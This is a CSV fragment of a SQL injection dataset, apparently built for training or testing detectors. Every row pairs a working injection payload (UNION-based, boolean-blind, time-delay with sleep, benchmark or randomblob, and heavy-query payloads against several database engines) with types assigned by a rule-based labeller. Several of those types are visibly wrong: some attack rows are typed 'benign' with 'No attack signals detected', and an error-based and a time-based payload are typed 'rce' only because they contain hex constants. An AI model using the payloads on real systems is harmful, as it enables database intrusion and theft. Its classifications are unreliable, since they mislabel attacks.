row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
9870,"1' or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
9871,"-9758'+ ( select 'rlcy' where 3691 = 3691 union all select 3691,3691,3691,3691,3691,3691,3691--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
9872,"-4473' ) union all select 7656,7656#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
9873,-8922 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) -- krmh,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9874,"1' ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( 'amjh' = 'amjh",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
9875,"1' ) where 6774 = 6774 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
9876,"1"" ) where 6255 = 6255 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) --",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
9877,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( 'xcxr' like 'xcxr",1,,rce,generic,0.95,0x4c4d6142 detected — rce injection (priority 1) on generic,rule-based
9878,"1'+ ( select 'yfrs' where 4388 = 4388 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
9879,-9522 ) as lraw where 9472 = 9472 or ( 4087 = 8213 ) *8213--,1,,boolean_blind,generic,0.95,9472 = 9472 or detected — boolean_blind injection (priority 8) on generic,rule-based
9880,"1%"" or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
9881,"1"" ) where 5828 = 5828 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
9882,select sleep ( 5 ) and 'hhrw' like 'hhrw,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
9883,1 ) ) as nwyh where 7100 = 7100,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9884,"-1339 ) ) ) union all select 6318,6318,6318,6318,6318,6318,6318,6318,6318#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
9885,1'+ ( select 'dhcv' where 9372 = 9372,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9886,-8453 ) ) ) or 3038 = 3038,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9887,1' ) where 8274 = 8274,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
